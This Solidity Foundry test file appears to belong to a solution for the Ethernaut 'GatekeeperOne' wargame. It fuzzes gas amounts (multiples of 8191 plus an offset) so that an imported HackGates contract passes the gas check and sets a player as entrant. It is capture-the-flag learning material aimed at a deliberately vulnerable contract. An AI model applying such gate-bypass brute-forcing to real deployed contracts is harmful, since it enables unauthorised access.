// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/HackGates.sol";

contract DeployHack is Test {
    address player = <player address>;
    HackGates hack = new HackGates();
    GatekeeperOne gates = hack.gates();

    function testFailHack(uint8 gasVal, uint8 multiplier) public {
        vm.assume(gasVal > 0 && gasVal <= 8191);
        vm.assume(multiplier >= 1 && multiplier <= 10);
         
        uint attempt = ((8191 * multiplier) + gasVal);

        vm.assume(attempt <= gasleft());
        
        vm.prank(player);
        hack.hackGate(attempt);

        if(player == verify()) {
            console.log("Pass Gas: %d Mul: %d", gasVal,multiplier);
        }
        else {
            console.log("Fail Gas: %d Mul: %d", gasVal,multiplier);
        }
    }

    function testHack() public {     
        uint attempt = ((8191 * 10) + 256);
        
        vm.prank(player);
        hack.hackGate(attempt);

        assertEq(player, verify());
    }

    function verify() public view returns (address entrant){
        entrant = gates.entrant();
    }
}